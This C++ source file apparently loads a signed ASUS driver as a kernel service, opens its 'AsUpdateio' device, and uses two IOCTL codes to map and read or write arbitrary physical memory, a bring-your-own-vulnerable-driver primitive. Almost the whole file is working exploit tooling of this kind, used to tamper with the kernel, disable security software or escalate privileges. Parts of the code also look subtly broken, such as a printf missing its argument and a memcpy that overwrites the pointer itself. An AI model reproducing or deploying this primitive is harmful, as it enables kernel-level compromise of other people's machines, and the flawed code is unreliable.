#include "Driver.h"
NTSTATUS Driver::CreateDriver() {
    SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (hSCM == NULL) {
        printf("[-] Failed to open Service Control Manager\n");
        return 0xDC000000;
    }

    SC_HANDLE hService = CreateService(hSCM,
        ServiceName,
        ServiceName,
        SERVICE_ALL_ACCESS,
        SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_NORMAL,
        DriverLocation,
        NULL,
        NULL,
        NULL,
        NULL,
        NULL);

    if (hService == NULL) {
        printf("[-] Failed to create service %d\n");
        CloseServiceHandle(hSCM);
        return 0xDC000001;
    }
    printf("[-] Created Driver: %s\n", ServiceName);
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    return 0;
}
NTSTATUS Driver::DeleteDriver() {
    SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (hSCM == NULL) {
        printf("[-] Failed to open Service Control Manager\n");
        return 0xDD000000;
    }

    SC_HANDLE hService = OpenService(hSCM, ServiceName, SERVICE_ALL_ACCESS);

    if (hService == NULL) {
        printf("[-] Failed to Open service\n");
        CloseServiceHandle(hSCM);
        return 0xDD000001;
    }
    if (!DeleteService(hService)) {
        std::cout << "Failed to delete the driver service." << std::endl;
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCM);
        return 0xDD000002;
    }
    printf("[-] Deleted Driver: %s\n", ServiceName);

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    return 0;
}

NTSTATUS Driver::StartDriver() {
    NTSTATUS CreateStatus = CreateDriver();
    if (!CreateStatus) {
        SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
        if (hSCM == NULL) {
            printf("[-] Failed to open Service Control Manager\n");
            DeleteDriver();
            return 0xBB100000;
        }

        SC_HANDLE hService = OpenService(hSCM, ServiceName, SERVICE_ALL_ACCESS);

        if (hService == NULL) {
            printf("[-] Failed to Open service\n");
            CloseServiceHandle(hSCM);
            DeleteDriver();
            return 0xBB100001;
        }
        if (!StartServiceA(hService, 0, NULL)) {
            std::cout << "Failed to Start the driver service." << std::endl;
            CloseServiceHandle(hService);
            CloseServiceHandle(hSCM);
            DeleteDriver();
            return 0xBB100002;
        }
        printf("[-] Started Driver: %s\n", ServiceName);

        CloseServiceHandle(hService);
        CloseServiceHandle(hSCM);
        DriverHandle = CreateFileA("\\\\.\\AsUpdateio", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        printf("[-] DriverHandle: %x\n", DriverHandle);
        return 0;
    }
    return CreateStatus;
}
NTSTATUS Driver::StopDriver() {
    CloseHandle(DriverHandle);
    SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (hSCM == NULL) {
        printf("[-] Failed to open Service Control Manager\n");
        DeleteDriver();
        return 0xBB100000;
    }

    SC_HANDLE hService = OpenService(hSCM, ServiceName, SERVICE_ALL_ACCESS);
    if (hService == NULL) {
        printf("[-] Failed to Open service\n");
        CloseServiceHandle(hSCM);
        DeleteDriver();
        return 0xBB100001;
    }

    SERVICE_STATUS serviceStatus;
    if (!ControlService(hService, SERVICE_CONTROL_STOP, &serviceStatus)) {
        printf("[-] Failed to Stop the driver service\n");
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCM);
        DeleteDriver();
        return 0xBB100002;
    }

    while (serviceStatus.dwCurrentState != SERVICE_STOPPED) {
        Sleep(1000); 
        if (!QueryServiceStatus(hService, &serviceStatus)) {
            printf("[-] Failed to query service status\n");
            CloseServiceHandle(hService);
            CloseServiceHandle(hSCM);
            DeleteDriver();
            return 0xBB100003;
        }
    }
    printf("[-] Stopped Driver: %s\n", ServiceName);
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    return DeleteDriver();
}


bool Driver::ReadPhysical(__int64 PhysicalAddr, void* Buffer, int size)
{

    DWORD bytesReturned;
    ASUSCall D;
    D.AddressSpace = 0;
    D.InterFaceSize = 0;
    D.InterFaceType = 1;
    D.SIZE = (int)(size - (unsigned int)(unsigned __int16)PhysicalAddr);
    D.PhysicalAddress = PhysicalAddr;

    __int64* BufferReturn = new __int64;
    if (!DeviceIoControl(DriverHandle, 0xA040244C, &D, sizeof(D), BufferReturn, sizeof(BufferReturn), &bytesReturned, NULL)) {
        printf("[-] Failed to send IOCTL request %d\n", GetLastError());
        return false;
    }



    memcpy(&BufferReturn, BufferReturn, 4);
    memcpy(Buffer, (void*)BufferReturn, size);
    __int64* Data = BufferReturn;
    if (!DeviceIoControl(DriverHandle, 0xA0402450, &Data, sizeof(Data), &Data, sizeof(Data), &bytesReturned, NULL)) {
        printf("[-] Failed to send IOCTL request %d\n", GetLastError());
        return false;
    }
    return true;
}
bool Driver::WritePhysical(__int64 PhysicalAddr, void* Buffer, int size)
{

    DWORD bytesReturned;
    ASUSCall D;
    D.AddressSpace = 0;
    D.InterFaceSize = 0;
    D.InterFaceType = 1;
    D.SIZE = (int)(size - (unsigned int)(unsigned __int16)PhysicalAddr);
    D.PhysicalAddress = PhysicalAddr;

    __int64* BufferReturn = new __int64;
    if (!DeviceIoControl(DriverHandle, 0xA040244C, &D, sizeof(D), BufferReturn, sizeof(BufferReturn), &bytesReturned, NULL)) {
        printf("[-] Failed to send IOCTL request %d\n", GetLastError());
        return false;
    }



    memcpy(&BufferReturn, BufferReturn, 4);
    memcpy(BufferReturn, (void*)Buffer, size);
    __int64* Data = BufferReturn;
    if (!DeviceIoControl(DriverHandle, 0xA0402450, &Data, sizeof(Data), &Data, sizeof(Data), &bytesReturned, NULL)) {
        printf("[-] Failed to send IOCTL request %d\n", GetLastError());
        return false;
    }
    return true;

}
